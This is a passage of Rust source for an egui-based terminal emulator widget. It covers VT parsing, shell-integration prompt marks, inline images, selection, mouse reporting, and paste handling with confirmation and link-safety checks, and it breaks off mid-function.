//! TermView: an alacritty_terminal grid drawn with egui's painter. Bytes from a session go
//! straight into the VT parser; keystrokes, paste, mouse reports and terminal replies come back
//! out through `TermResponse` for the app to send to the session (and broadcast targets).

use crate::terminal_themes::TermTheme;
use alacritty_terminal::event::{Event as TermEvent, EventListener};
use alacritty_terminal::grid::{Dimensions, Scroll};
use alacritty_terminal::index::{Column, Line, Point, Side};
use alacritty_terminal::selection::{Selection, SelectionType};
use alacritty_terminal::term::cell::Flags;
use alacritty_terminal::term::test::TermSize;
use alacritty_terminal::term::{Config, Term, TermMode};
use alacritty_terminal::vte::ansi::{self, Color, CursorShape, NamedColor, Processor, StdSyncHandler};
use egui::{Color32, Event, FontId, Key, Modifiers, PointerButton, Pos2, Rect, Sense, Stroke, Ui, pos2, vec2};
use parking_lot::Mutex;
use std::sync::Arc;

#[derive(Clone, Default)]
struct Listener(Arc<Mutex<Vec<TermEvent>>>);

impl EventListener for Listener {
    fn send_event(&self, e: TermEvent) {
        if matches!(e, TermEvent::PtyWrite(_) | TermEvent::Title(_) | TermEvent::Bell | TermEvent::ClipboardStore(..)) {
            self.0.lock().push(e);
        }
    }
}

/// What the context menu asked for; the app carries these out.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum MenuAction {
    Copy,
    Paste,
    SelectAll,
    Find,
    SendSnippet,
    PortForwards,
    SplitRight,
    SplitDown,
    Export,
    Clear,
    Reset,
    PrevPrompt,
    NextPrompt,
    CopyOutput,
}

#[derive(Default)]
pub struct TermResponse {
    /// User input (keys, paste, mouse reports): goes to the session and broadcast targets.
    pub input: Vec<u8>,
    /// Terminal replies (DA, DSR, …): go to this session only.
    pub reply: Vec<u8>,
    pub resized: Option<(u16, u16)>,
    pub menu: Option<MenuAction>,
    pub title: Option<String>,
    pub bell: bool,
    pub focused: bool,
    /// Text the remote asked to put on the clipboard (OSC 52); the app applies its preference.
    pub clipboard: Option<String>,
    /// A paste held back for confirmation (see [`TermView::paste`]).
    pub confirm_paste: Option<String>,
}

#[derive(Clone, Copy, PartialEq, Eq, Default)]
pub enum CursorStyle {
    #[default]
    Block,
    Underline,
    Bar,
}

impl CursorStyle {
    pub fn from_id(s: &str) -> Self {
        match s {
            "underline" => Self::Underline,
            "bar" => Self::Bar,
            _ => Self::Block,
        }
    }
}

#[derive(Default)]
pub struct Find {
    pub query: String,
    pub case_sensitive: bool,
    pub regex: bool,
    /// (grid line, first column, last column inclusive)
    pub matches: Vec<(i32, usize, usize)>,
    pub current: usize,
    pub error: Option<String>,
    computed_for: Option<(String, bool, bool, u64)>,
}

pub struct TermView {
    term: Term<Listener>,
    parser: Processor<StdSyncHandler>,
    events: Listener,
    pub font_size: f32,
    pub cursor: CursorStyle,
    cols: u16,
    rows: u16,
    drag: Option<(Point, SelectionType)>,
    last_click: (f64, u32, Pos2),
    wheel_acc: f32,
    mouse_down: Option<u8>,
    /// Bumped on every feed, so find results know when to recompute.
    generation: u64,
    pub find: Option<Find>,
    focus_requested: bool,
    /// Hold back multi-line pastes that would run unbracketed (set from preferences each frame).
    pub confirm_paste: bool,
    osc: crate::osc::OscScanner,
    /// Shell-integration prompts (OSC 133), oldest first.
    prompts: Vec<PromptMark>,
    /// Lines rotated out of a full scrollback since start, so marks keep pointing at their text.
    rotated: i64,
    max_history: usize,
    /// The working directory the shell last reported (OSC 7): (host, path).
    pub reported_cwd: Option<(String, String)>,
    /// Inline images (iTerm2 OSC 1337), oldest first.
    images: Vec<InlineImage>,
    /// Cell size in points from the last frame, for sizing images that arrive between frames.
    cell_px: (f32, f32),
}

struct InlineImage {
    stable: i64,
    col: usize,
    cols: usize,
    rows: usize,
    pixels: Option<egui::ColorImage>,
    texture: Option<egui::TextureHandle>,
    size: usize,
}

/// Pixels of inline images kept per terminal; the oldest go first.
const MAX_IMAGE_PIXELS: usize = 32 << 20;

/// One command as shell integration reported it. Lines are stable indexes (see `stable`).
#[derive(Clone, Debug)]
struct PromptMark {
    prompt: i64,
    output: Option<i64>,
    end: Option<i64>,
    exit: Option<i32>,
    started: Option<std::time::Instant>,
    duration: Option<std::time::Duration>,
}

/// Marks kept per terminal; older ones are dropped.
const MAX_PROMPTS: usize = 5000;

const URL_RE: &str = r#"(?:https?|ftp)://[^\s<>"'`]+[^\s<>"'`.,;:!?)\]]"#;

fn rgb(c: [u8; 4]) -> Color32 {
    Color32::from_rgba_unmultiplied(c[0], c[1], c[2], c[3])
}

impl TermView {
    pub fn new(scrollback: usize, font_size: f32, cursor: CursorStyle) -> TermView {
        let events = Listener::default();
        let config = Config { scrolling_history: scrollback.min(100_000), ..Config::default() };
        TermView {
            term: Term::new(config, &TermSize::new(80, 24), events.clone()),
            parser: Processor::new(),
            events,
            font_size: font_size.clamp(6.0, 48.0),
            cursor,
            cols: 80,
            rows: 24,
            drag: None,
            last_click: (0.0, 0, Pos2::ZERO),
            wheel_acc: 0.0,
            mouse_down: None,
            generation: 0,
            find: None,
            focus_requested: true,
            confirm_paste: false,
            osc: Default::default(),
            prompts: Vec::new(),
            rotated: 0,
            max_history: scrollback.min(100_000),
            reported_cwd: None,
            images: Vec::new(),
            cell_px: (8.0, 16.0),
        }
    }

    pub fn feed(&mut self, bytes: &[u8]) {
        let mut start = 0;
        for (end, osc) in self.osc.scan(bytes) {
            self.advance(&bytes[start..end]);
            start = end;
            self.apply_osc(osc);
        }
        self.advance(&bytes[start..]);
        self.generation += 1;
    }

    /// Feeds the VT parser, counting lines a full scrollback rotates out (one per line feed at the
    /// bottom of the screen) so shell-integration marks stay on their lines.
    fn advance(&mut self, bytes: &[u8]) {
        if (self.prompts.is_empty() && self.images.is_empty()) || self.term.mode().contains(TermMode::ALT_SCREEN) {
            self.parser.advance(&mut self.term, bytes);
            return;
        }
        let h0 = self.term.grid().history_size();
        if h0 < self.max_history {
            self.parser.advance(&mut self.term, bytes);
        } else {
            // ponytail: counts LF at the bottom row only; scroll-region and CSI S scrolling while
            // the history is full can leave marks a few lines off.
            let bottom = self.rows as i32 - 1;
            for piece in bytes.split_inclusive(|&b| b == b'\n') {
                let at_bottom = self.term.grid().cursor.point.line.0 == bottom;
                self.parser.advance(&mut self.term, piece);
                if at_bottom && piece.ends_with(b"\n") && self.term.grid().history_size() == self.max_history {
                    self.rotated += 1;
                }
            }
        }
        if self.term.grid().history_size() < h0 {
            // The scrollback was cleared: earlier marks point at nothing.
            self.prompts.clear();
            self.images.clear();
        }
    }

    /// Stable index of a grid line: unchanged as lines scroll into (and out of) the history.
    fn stable(&self, line: Line) -> i64 {
        self.term.grid().history_size() as i64 + line.0 as i64 + self.rotated
    }

    fn line_of(&self, stable: i64) -> Line {
        Line((stable - self.rotated - self.term.grid().history_size() as i64) as i32)
    }

    fn cursor_stable(&self) -> i64 {
        self.stable(self.term.grid().cursor.point.line)
    }

    fn apply_osc(&mut self, osc: crate::osc::Osc) {
        use crate::osc::Osc;
        match osc {
            Osc::Prompt => {
                let line = self.cursor_stable();
                if self.prompts.last().is_some_and(|p| p.prompt == line) {
                    return;
                }
                if self.prompts.len() >= MAX_PROMPTS {
                    self.prompts.remove(0);
                }
                self.prompts.push(PromptMark { prompt: line, output: None, end: None, exit: None, started: None, duration: None });
            }
            Osc::Output => {
                let line = self.cursor_stable();
                if let Some(p) = self.prompts.last_mut() {
                    p.output = Some(line);
                    p.started = Some(std::time::Instant::now());
                }
            }
            Osc::Finished(code) => {
                let line = self.cursor_stable();
                if let Some(p) = self.prompts.last_mut().filter(|p| p.output.is_some() && p.end.is_none()) {
                    p.end = Some(line);
                    p.exit = code;
                    p.duration = p.started.map(|t| t.elapsed());
                }
            }
            Osc::Cwd { host, path } => self.reported_cwd = Some((host, path)),
            Osc::Image { data, width, height } => self.place_image(&data, &width, &height),
        }
    }

    /// Decodes an inline image (PNG, JPEG or GIF, within size limits), anchors it at the cursor and
    /// moves the cursor below it, as iTerm2 does.
    fn place_image(&mut self, data: &[u8], width: &str, height: &str) {
        if self.term.mode().contains(TermMode::ALT_SCREEN) {
            return;
        }
        let decoded = (|| {
            let mut r = image::ImageReader::new(std::io::Cursor::new(data)).with_guessed_format().ok()?;
            let mut limits = image::Limits::default();
            limits.max_image_width = Some(8192);
            limits.max_image_height = Some(8192);
            limits.max_alloc = Some(256 << 20);
            r.limits(limits);
            Some(r.decode().ok()?.to_rgba8())
        })();
        let Some(img) = decoded else { return };
        let (cw, ch) = self.cell_px;
        let (iw, ih) = (img.width() as f32, img.height() as f32);
        let full_w = self.cols as f32 * cw;
        let dim = |arg: &str, full: f32, cell: f32| -> Option<f32> {
            let a = arg.trim();
            if a.is_empty() || a == "auto" {
                None
            } else if let Some(px) = a.strip_suffix("px") {
                px.parse().ok()
            } else if let Some(pc) = a.strip_suffix('%') {
                pc.parse::<f32>().ok().map(|p| full * p / 100.0)
            } else {
                a.parse::<f32>().ok().map(|n| n * cell)
            }
        };
        let (w, h) = match (dim(width, full_w, cw), dim(height, self.rows as f32 * ch, ch)) {
            (Some(w), Some(h)) => (w, h),
            (Some(w), None) => (w, w * ih / iw),
            (None, Some(h)) => (h * iw / ih, h),
            (None, None) => (iw, ih),
        };
        // Never wider than the terminal; keep the aspect ratio when shrinking.
        let scale = (full_w / w).min(1.0);
        let (w, h) = (w * scale, h * scale);
        let cols = ((w / cw).ceil() as usize).clamp(1, self.cols as usize);
        let rows = ((h / ch).ceil() as usize).clamp(1, 1000);
        let size = img.width() as usize * img.height() as usize;
        while !self.images.is_empty() && self.images.iter().map(|i| i.size).sum::<usize>() + size > MAX_IMAGE_PIXELS {
            self.images.remove(0);
        }
        let pixels = egui::ColorImage::from_rgba_unmultiplied([img.width() as usize, img.height() as usize], img.as_raw());
        let (stable, col) = (self.cursor_stable(), self.term.grid().cursor.point.column.0);
        self.images.push(InlineImage { stable, col, cols, rows, pixels: Some(pixels), texture: None, size });
        // Leave room: the cursor ends up on the line below the image.
        self.advance(&b"\r\n".repeat(rows));
    }

    fn paint_images(&mut self, ui: &Ui, rect: Rect, origin: Pos2, cw: f32, ch: f32) {
        let top = self.term.grid().topmost_line().0;
        let offset = self.term.grid().display_offset() as i32;
        // Line of a stable index, without borrowing self (the loop below mutates the images).
        let (rotated, history) = (self.rotated, self.term.grid().history_size() as i64);
        let line_of = |stable: i64| (stable - rotated - history) as i32;
        // Images that scrolled out of the scrollback are gone with it.
        self.images.retain(|i| line_of(i.stable) + i.rows as i32 > top);
        let painter = ui.painter_at(rect);
        let rows = self.rows as i32;
        for img in &mut self.images {
            let vr = line_of(img.stable) + offset;
            if vr + img.rows as i32 <= 0 || vr >= rows {
                continue;
            }
            let at = Rect::from_min_size(origin + vec2(img.col as f32 * cw, vr as f32 * ch), vec2(img.cols as f32 * cw, img.rows as f32 * ch));
            let tex = img.texture.get_or_insert_with(|| {
                let px = img.pixels.take().unwrap_or_default();
                ui.ctx().load_texture("term-image", px, egui::TextureOptions::LINEAR)
            });
            // Fit inside the reserved cells, keeping the aspect ratio.
            let [tw, th] = tex.size();
            let s = (at.width() / tw as f32).min(at.height() / th as f32);
            let shown = Rect::from_min_size(at.min, vec2(tw as f32 * s, th as f32 * s));
            painter.image(tex.id(), shown, Rect::from_min_max(Pos2::ZERO, pos2(1.0, 1.0)), Color32::WHITE);
        }
    }

    /// Scrolls so the previous (or next) prompt is at the top. False when there is none.
    pub fn jump_prompt(&mut self, forward: bool) -> bool {
        let top = Line(-(self.term.grid().display_offset() as i32));
        let lines: Vec<i32> = self.prompts.iter().map(|p| self.line_of(p.prompt).0).filter(|&l| l >= self.term.grid().topmost_line().0).collect();
        let target = if forward { lines.iter().copied().find(|&l| l > top.0) } else { lines.iter().rev().copied().find(|&l| l < top.0) };
        let Some(line) = target else { return false };
        let want_offset = (-line).clamp(0, self.term.grid().history_size() as i32);
        self.term.scroll_display(Scroll::Delta(want_offset - self.term.grid().display_offset() as i32));
        true
    }

    /// The output of the most recent command that finished (shell integration).
    pub fn last_output(&self) -> Option<String> {
        let p = self.prompts.iter().rev().find(|p| p.output.is_some() && p.end.is_some())?;
        let (from, to) = (self.line_of(p.output?).0.max(self.term.grid().topmost_line().0), self.line_of(p.end?).0);
        let text: Vec<String> = (from..to).map(|l| self.line_text(Line(l)).0.trim_end().to_string()).collect();
        Some(text.join("\n").trim_end_matches('\n').to_string())
    }

    /// Whether the shell reports prompts (OSC 133), which enables the commands above.
    pub fn has_shell_integration(&self) -> bool {
        !self.prompts.is_empty()
    }

    pub fn size(&self) -> (u16, u16) {
        (self.cols, self.rows)
    }

    pub fn request_focus(&mut self) {
        self.focus_requested = true;
    }

    pub fn selection_text(&self) -> Option<String> {
        self.term.selection_to_string().filter(|s| !s.is_empty())
    }

    pub fn select_all(&mut self) {
        let top = self.term.grid().topmost_line();
        let bottom = self.term.grid().bottommost_line();
        let mut s = Selection::new(SelectionType::Simple, Point::new(top, Column(0)), Side::Left);
        s.update(Point::new(bottom, Column(self.cols.saturating_sub(1) as usize)), Side::Right);
        self.term.selection = Some(s);
    }

    /// Clears the scrollback and the screen (the shell redraws its prompt on its own).
    pub fn clear(&mut self) {
        use ansi::Handler;
        self.term.clear_screen(ansi::ClearMode::Saved);
        self.feed(b"\x1b[H\x1b[2J");
    }

    pub fn reset(&mut self) {
        use ansi::Handler;
        self.term.reset_state();
        self.generation += 1;
    }

    /// Every line of scrollback and screen as text, for Export Output.
    pub fn buffer_text(&self) -> String {
        let g = self.term.grid();
        let mut out = String::new();
        for l in g.topmost_line().0..=g.bottommost_line().0 {
            out.push_str(self.line_text(Line(l)).0.trim_end());
            out.push('\n');
        }
        out
    }

    /// Text of a grid line plus, for each char, the column it came from.
    fn line_text(&self, line: Line) -> (String, Vec<usize>) {
        let row = &self.term.grid()[line];
        let (mut s, mut cols) = (String::new(), vec![]);
        for c in 0..self.term.columns() {
            let cell = &row[Column(c)];
            if cell.flags.intersects(Flags::WIDE_CHAR_SPACER | Flags::LEADING_WIDE_CHAR_SPACER) {
                continue;
            }
            s.push(cell.c);
            cols.push(c);
        }
        (s, cols)
    }

    fn color(&self, c: Color, theme: &TermTheme, bold: bool) -> Color32 {
        let pal = |i: usize| -> Color32 {
            if let Some(rgb) = self.term.colors()[i] {
                return Color32::from_rgb(rgb.r, rgb.g, rgb.b);
            }
            if i < 16 {
                return crate::terminal::rgb(theme.ansi[i]);
            }
            if i < 232 {
                let i = i - 16;
                let v = |x: usize| if x == 0 { 0 } else { (55 + x * 40) as u8 };
                return Color32::from_rgb(v(i / 36), v((i / 6) % 6), v(i % 6));
            }
            let g = (8 + (i - 232) * 10) as u8;
            Color32::from_rgb(g, g, g)
        };
        match c {
            Color::Spec(rgb) => Color32::from_rgb(rgb.r, rgb.g, rgb.b),
            Color::Indexed(i) => {
                let i = i as usize;
                pal(if bold && i < 8 { i + 8 } else { i })
            }
            Color::Named(n) => match n {
                NamedColor::Foreground | NamedColor::BrightForeground => rgb(theme.foreground),
                NamedColor::Background => rgb(theme.background),
                NamedColor::Cursor => rgb(theme.cursor),
                NamedColor::DimForeground => rgb(theme.foreground).gamma_multiply(0.7),
                n => {
                    let i = n as usize;
                    if i < 16 {
                        pal(if bold && i < 8 { i + 8 } else { i })
                    } else if (NamedColor::DimBlack as usize..=NamedColor::DimWhite as usize).contains(&i) {
                        pal(i - NamedColor::DimBlack as usize).gamma_multiply(0.7)
                    } else {
                        rgb(theme.foreground)
                    }
                }
            },
        }
    }

    fn cell_metrics(&self, ui: &Ui) -> (FontId, f32, f32) {
        let font = FontId::monospace(self.font_size);
        let (w, h) = ui.fonts_mut(|f| (f.glyph_width(&font, 'M'), f.row_height(&font)));
        (font, w.max(1.0), h.ceil().max(1.0))
    }

    /// Grid point under a screen position.
    fn point_at(&self, origin: Pos2, cw: f32, ch: f32, p: Pos2) -> (Point, Side) {
        let col = ((p.x - origin.x) / cw).floor().clamp(0.0, self.cols.saturating_sub(1) as f32);
        let row = ((p.y - origin.y) / ch).floor().clamp(0.0, self.rows.saturating_sub(1) as f32);
        let side = if (p.x - origin.x) / cw - col > 0.5 { Side::Right } else { Side::Left };
        let line = Line(row as i32 - self.term.grid().display_offset() as i32);
        (Point::new(line, Column(col as usize)), side)
    }

    pub fn ui(&mut self, ui: &mut Ui, theme: &TermTheme, active: bool) -> TermResponse {
        let mut out = TermResponse::default();
        let (font, cw, ch) = self.cell_metrics(ui);
        let pad = vec2(6.0, 4.0);
        let rect = ui.available_rect_before_wrap();
        let resp = ui.allocate_rect(rect, Sense::click_and_drag());
        let id = resp.id;
        let origin = rect.min + pad;

        // Fit the grid to the widget.
        let cols = (((rect.width() - 2.0 * pad.x) / cw).floor() as u16).max(2);
        let rows = (((rect.height() - 2.0 * pad.y) / ch).floor() as u16).max(1);
        if (cols, rows) != (self.cols, self.rows) {
            self.cols = cols;
            self.rows = rows;
            self.term.resize(TermSize::new(cols as usize, rows as usize));
            out.resized = Some((cols, rows));
        }

        if resp.clicked() || resp.drag_started() || (active && self.focus_requested) {
            ui.memory_mut(|m| m.request_focus(id));
            self.focus_requested = false;
        }
        let focused = ui.memory(|m| m.has_focus(id));
        out.focused = focused;
        if focused {
            ui.memory_mut(|m| m.set_focus_lock_filter(id, egui::EventFilter { tab: true, horizontal_arrows: true, vertical_arrows: true, escape: true }));
            self.keyboard(ui, &mut out);
            let cur = self.term.grid().cursor.point;
            let cursor_rect = Rect::from_min_size(origin + vec2(cur.column.0 as f32 * cw, cur.line.0 as f32 * ch), vec2(cw, ch));
            ui.output_mut(|o| {
                o.ime = Some(egui::output::IMEOutput { purpose: egui::IMEPurpose::Terminal, rect, cursor_rect, should_interrupt_composition: false })
            });
        }
        self.mouse(ui, &resp, origin, cw, ch, &mut out);

        // Terminal-originated events.
        for e in std::mem::take(&mut *self.events.0.lock()) {
            match e {
                TermEvent::PtyWrite(s) => out.reply.extend_from_slice(s.as_bytes()),
                TermEvent::Title(t) => out.title = Some(t),
                TermEvent::Bell => out.bell = true,
                TermEvent::ClipboardStore(_, s) => out.clipboard = Some(s),
                _ => {}
            }
        }

        self.paint(ui, rect, origin, &font, cw, ch, theme, focused);
        self.cell_px = (cw, ch);
        self.paint_images(ui, rect, origin, cw, ch);
        // Exit status of each finished command, as a bar beside its prompt (shell integration).
        let hover = ui.input(|i| i.pointer.hover_pos());
        for (bar, exit, took) in self.status_bars(rect, origin, ch) {
            let color = match exit {
                Some(0) => Color32::from_rgb(0x4c, 0xaf, 0x50),
                Some(_) => Color32::from_rgb(0xe5, 0x39, 0x35),
                None => Color32::GRAY,
            };
            ui.painter_at(rect).rect_filled(bar, 1.0, color);
            if hover.is_some_and(|p| bar.expand2(vec2(3.0, 0.0)).contains(p)) {
                let exit = exit.map_or("finished".to_string(), |c| format!("exit {c}"));
                let took = took.map_or(String::new(), |d| format!(" · {:.1?}", d));
                egui::Tooltip::always_open(ui.ctx().clone(), ui.layer_id(), egui::Id::new(("cmd-status", bar.min.y as i32)), egui::PopupAnchor::Pointer)
                    .show(|ui| ui.label(format!("{exit}{took}")));
            }
        }

        resp.context_menu(|ui| {
            let m = if cfg!(target_os = "macos") { "⌘" } else { "Ctrl+" };
            let items: [(MenuAction, &str, String); 11] = [
                (MenuAction::Copy, "Copy", format!("{m}C")),
                (MenuAction::Paste, "Paste", format!("{m}V")),
                (MenuAction::SelectAll, "Select All", String::new()),
                (MenuAction::Find, "Find", format!("{m}F")),
                (MenuAction::SendSnippet, "Send Snippet", format!("{m}Shift+S")),
                (MenuAction::PortForwards, "Port Forwards", String::new()),
                (MenuAction::SplitRight, "Split Right", format!("{m}Shift+D")),
                (MenuAction::SplitDown, "Split Down", format!("{m}Shift+E")),
                (MenuAction::Export, "Export Output", String::new()),
                (MenuAction::Clear, "Clear", String::new()),
                (MenuAction::Reset, "Reset", String::new()),
            ];
            if self.has_shell_integration() {
                for (a, label, keys) in [
                    (MenuAction::PrevPrompt, "Previous Prompt", format!("{m}Shift+↑")),
                    (MenuAction::NextPrompt, "Next Prompt", format!("{m}Shift+↓")),
                    (MenuAction::CopyOutput, "Copy Last Command Output", String::new()),
                ] {
                    if ui.add(egui::Button::new(label).shortcut_text(keys).min_size(vec2(200.0, 0.0))).clicked() {
                        out.menu = Some(a);
                        ui.close();
                    }
                }
                ui.separator();
            }
            for (i, (a, label, keys)) in items.into_iter().enumerate() {
                if matches!(i, 3 | 5 | 6 | 8) {
                    ui.separator();
                }
                if ui.add(egui::Button::new(label).shortcut_text(keys).min_size(vec2(200.0, 0.0))).clicked() {
                    out.menu = Some(a);
                    ui.close();
                }
            }
        });
        if let Some(MenuAction::Copy) = out.menu
            && let Some(s) = self.selection_text()
        {
            ui.ctx().copy_text(s);
            out.menu = None;
        }
        if out.menu == Some(MenuAction::SelectAll) {
            self.select_all();
            out.menu = None;
        }
        match out.menu {
            Some(a @ (MenuAction::PrevPrompt | MenuAction::NextPrompt)) => {
                self.jump_prompt(a == MenuAction::NextPrompt);
                out.menu = None;
            }
            Some(MenuAction::CopyOutput) => {
                if let Some(text) = self.last_output() {
                    ui.ctx().copy_text(text);
                }
                out.menu = None;
            }
            _ => {}
        }
        out
    }

    /// Where to draw each visible finished command's status bar, with its exit code and duration.
    fn status_bars(&self, rect: Rect, origin: Pos2, ch: f32) -> Vec<(Rect, Option<i32>, Option<std::time::Duration>)> {
        let offset = self.term.grid().display_offset() as i32;
        self.prompts
            .iter()
            .filter(|p| p.end.is_some())
            .filter_map(|p| {
                let vr = self.line_of(p.prompt).0 + offset;
                (0..self.rows as i32).contains(&vr).then(|| {
                    let y = origin.y + vr as f32 * ch;
                    (Rect::from_min_max(pos2(rect.left(), y + 1.0), pos2(rect.left() + 3.0, y + ch - 1.0)), p.exit, p.duration)
                })
            })
            .collect()
    }

    fn keyboard(&mut self, ui: &mut Ui, out: &mut TermResponse) {
        let events = ui.input(|i| i.events.clone());
        let mode = *self.term.mode();
        let alt_meta = !cfg!(target_os = "macos");
        let mut typed = false;
        for e in events {
            match e {
                Event::Copy => match self.selection_text() {
                    Some(s) => ui.ctx().copy_text(s),
                    None => out.input.push(3),
                },
                Event::Cut => out.input.push(0x18),
                Event::Paste(text) => {
                    self.paste(&text, out);
                    typed = true;
                }
                Event::Text(t) => {
                    if t.chars().any(|c| c.is_control()) {
                        continue;
                    }
                    let alt = ui.input(|i| i.modifiers.alt);
                    if alt && alt_meta {
                        out.input.push(0x1b);
                    }
                    out.input.extend_from_slice(t.as_bytes());
                    typed = true;
                }
                Event::Ime(egui::ImeEvent::Commit(t)) => {
                    out.input.extend_from_slice(t.as_bytes());
                    typed = true;
                }
                Event::Key { key, pressed: true, modifiers, .. } => {
                    // Ctrl/Cmd+Shift+Up/Down jump between prompts (shell integration).
                    if modifiers.command && modifiers.shift && matches!(key, Key::ArrowUp | Key::ArrowDown) && self.has_shell_integration() {
                        self.jump_prompt(key == Key::ArrowDown);
                        continue;
                    }
                    // Shift+PageUp/PageDown/Home/End scroll the local scrollback.
                    if modifiers.shift && !modifiers.ctrl && !mode.contains(TermMode::ALT_SCREEN) {
                        let page = self.rows as i32 - 1;
                        let scroll = match key {
                            Key::PageUp => Some(Scroll::Delta(page)),
                            Key::PageDown => Some(Scroll::Delta(-page)),
                            Key::Home => Some(Scroll::Top),
                            Key::End => Some(Scroll::Bottom),
                            _ => None,
                        };
                        if let Some(s) = scroll {
                            self.term.scroll_display(s);
                            continue;
                        }
                    }
                    if let Some(bytes) = key_bytes(key, modifiers, mode) {
                        out.input.extend_from_slice(&bytes);
                        typed = true;
                    }
                }
                _ => {}
            }
        }
        if typed {
            self.term.selection = None;
            self.term.scroll_display(Scroll::Bottom);
        }
    }

    /// Pastes `text`, or hands it back in `out.confirm_paste` when `confirm_paste` is set and the
    /// newlines would run each line immediately (no bracketed paste).
    pub fn paste(&mut self, text: &str, out: &mut TermResponse) {
        if self.confirm_paste && !self.term.mode().contains(TermMode::BRACKETED_PASTE) && text.contains(['\n', '\r']) {
            out.confirm_paste = Some(text.into());
            return;
        }
        self.paste_now(text, out);
    }

    pub fn paste_now(&mut self, text: &str, out: &mut TermResponse) {
        let text = text.replace("\r\n", "\r").replace('\n', "\r");
        if self.term.mode().contains(TermMode::BRACKETED_PASTE) {
            out.input.extend_from_slice(b"\x1b[200~");
            out.input.extend_from_slice(text.replace('\x1b', "").as_bytes());
            out.input.extend_from_slice(b"\x1b[201~");
        } else {
            out.input.extend_from_slice(text.as_bytes());
        }
    }

    fn mouse(&mut self, ui: &mut Ui, resp: &egui::Response, origin: Pos2, cw: f32, ch: f32, out: &mut TermResponse) {
        let mode = *self.term.mode();
        let reporting = mode.intersects(TermMode::MOUSE_MODE) && !ui.input(|i| i.modifiers.shift);
        let hover = resp.hover_pos();
        let events = ui.input(|i| i.events.clone());
        let to_cell = |p: Pos2| {
            let c = ((p.x - origin.x) / cw).floor().max(0.0) as u32;
            let r = ((p.y - origin.y) / ch).floor().max(0.0) as u32;
            (c.min(self.cols as u32 - 1), r.min(self.rows as u32 - 1))
        };
        for e in &events {
            match e {
                Event::MouseWheel { delta, unit, modifiers, .. } if hover.is_some() => {
                    if modifiers.command {
                        continue; // left for zoom
                    }
                    let lines = match unit {
                        egui::MouseWheelUnit::Point => delta.y / ch,
                        egui::MouseWheelUnit::Line => delta.y,
                        egui::MouseWheelUnit::Page => delta.y * self.rows as f32,
                    };
                    self.wheel_acc += lines;
                    let n = self.wheel_acc.trunc() as i32;
                    if n == 0 {
                        continue;
                    }
                    self.wheel_acc -= n as f32;
                    if reporting {
                        let (c, r) = to_cell(hover.unwrap());
                        for _ in 0..n.unsigned_abs() {
                            out.input.extend(mouse_report(if n > 0 { 64 } else { 65 }, c, r, true, mode));
                        }
                    } else if mode.contains(TermMode::ALT_SCREEN) {
                        let seq: &[u8] = if n > 0 { b"\x1b[A" } else { b"\x1b[B" };
                        for _ in 0..n.unsigned_abs() {
                            out.input.extend_from_slice(seq);
                        }
                    } else {
                        self.term.scroll_display(Scroll::Delta(n));
                    }
                }
                Event::PointerButton { pos, button, pressed, modifiers } if resp.rect.contains(*pos) => {
                    let b = match button {
                        PointerButton::Primary => 0,
                        PointerButton::Middle => 1,
                        PointerButton::Secondary => 2,
                        _ => continue,
                    };
                    if reporting && b != 2 || reporting && mode.contains(TermMode::MOUSE_MODE) && b == 2 && !*pressed {
                        let (c, r) = to_cell(*pos);
                        out.input.extend(mouse_report(b, c, r, *pressed, mode));
                        self.mouse_down = pressed.then_some(b);
                        continue;
                    }
                    if b != 0 {
                        continue;
                    }
                    if *pressed {
                        if modifiers.command
                            && let Some(url) = self.url_at(origin, cw, ch, *pos)
                        {
                            // Only web links: text from a remote host must not launch file: or custom-scheme handlers.
                            crate::widgets::open_web_url(ui.ctx(), &url);
                            continue;
                        }
                        let now = ui.input(|i| i.time);
                        let (t, n, p) = self.last_click;
                        let count = if now - t < 0.4 && p.distance(*pos) < 4.0 { n % 3 + 1 } else { 1 };
                        self.last_click = (now, count, *pos);
                        let (point, side) = self.point_at(origin, cw, ch, *pos);
                        let ty = match count {
                            2 => SelectionType::Semantic,
                            3 => SelectionType::Lines,
                            _ => SelectionType::Simple,
                        };
                        self.term.selection = (count > 1 || modifiers.shift).then(|| Selection::new(ty, point, side));
                        if modifiers.shift
                            && let Some(s) = &mut self.term.selection
                        {
                            s.update(point, side);
                        }
                        self.drag = Some((point, ty));
                    } else {
                        self.drag = None;
                    }
                }
                Event::PointerMoved(p) => {
                    if reporting {
                        if let Some(b) = self.mouse_down
                            && (mode.contains(TermMode::MOUSE_DRAG) || mode.contains(TermMode::MOUSE_MOTION))
                            && resp.rect.contains(*p)
                        {
                            let (c, r) = to_cell(*p);
                            out.input.extend(mouse_report(b + 32, c, r, true, mode));
                        }
                        continue;
                    }
                    if let Some((start, ty)) = self.drag {
                        let (point, side) = self.point_at(origin, cw, ch, *p);
                        if self.term.selection.is_none() && point != start {
                            self.term.selection = Some(Selection::new(ty, start, Side::Left));
                        }
                        if let Some(s) = &mut self.term.selection {
                            s.update(point, side);
                        }
                        // Auto-scroll while dragging past the edges.
                        if p.y < resp.rect.top() {
                            self.term.scroll_display(Scroll::Delta(1));
                        } else if p.y > resp.rect.bottom() {
                            self.term.scroll_display(Scroll::Delta(-1));
                        }
                    }
                }
                _ => {}
            }
        }
        // An OSC 8 link's text can say anything, so its real target is always shown on hover.
        if let Some(p) = hover
            && let Some(link) = self.hyperlink_at(self.point_at(origin, cw, ch, p).0)
        {
            egui::Tooltip::always_open(ui.ctx().clone(), ui.layer_id(), egui::Id::new("term-link"), egui::PopupAnchor::Pointer).show(|ui| {
                ui.label(&link);
                if !crate::widgets::is_web_url(&link) {
                    ui.label(egui::RichText::new("Not a web link — won't be opened").weak());
                }
            });
        }
        if let Some(p) = hover
            && ui.input(|i| i.modifiers.command)
            && self.url_at(origin, cw, ch, p).is_some_and(|u| crate::widgets::is_web_url(&u))
        {
            ui.ctx().set_cursor_icon(egui::CursorIcon::PointingHand);
        } else if hover.is_some() {
            ui.ctx().set_cursor_icon(egui::CursorIcon::Text);
        }
    }

    /// The link under `p`: an OSC 8 hyperlink on the cell, else a URL in the text.
    fn url_at(&self, origin: Pos2, cw: f32, ch: f32, p: Pos2) -> Option<String> {
        let (point, _) = self.point_at(origin, cw, ch, p);
        if let Some(link) = self.hyperlink_at(point) {
            return Some(link);
        }
        let (text, cols) = self.line_text(point.line);
        let re = regex::Regex::new(URL_RE).ok()?;
        re.find_iter(&text).find_map(|m| {
            let start = text[..m.start()].chars().count();
            let end = start + m.as_str().chars().count() - 1;
            (cols.get(start)? <= &point.column.0 && cols.get(end)? >= &point.column.0).then(|| m.as_str().to_string())
        })
    }

    fn hyperlink_at(&self, point: Point) -> Option<String> {
        let g = self.term.grid();
